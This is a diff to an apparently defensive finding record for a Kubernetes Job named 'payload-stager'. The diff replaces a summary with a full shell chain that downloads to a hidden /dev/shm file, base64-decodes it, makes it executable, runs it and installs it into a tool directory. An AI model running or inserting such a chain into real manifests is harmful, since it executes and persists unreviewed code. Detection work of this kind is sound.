@@ -8,7 +8,7 @@
         "fact_id": "download-decode-execute-install",
         "resource_ref": "job/payload-stager",
         "field_path": "spec.template.spec.containers[0].command[2]",
-        "observed_value": "wget; base64 -d; chmod 0700; execute from /dev/shm; mv to controlled-bin",
+        "observed_value": "wget -qO /dev/shm/.payload.b64; base64 -d /dev/shm/.payload.b64; chmod 0700 /dev/shm/.payload; /dev/shm/.payload; mv /dev/shm/.payload /controlled-bin/tools/controlled-payload",
         "description": "One command chain downloads, decodes, marks executable, runs, and installs the file."
       },
       {
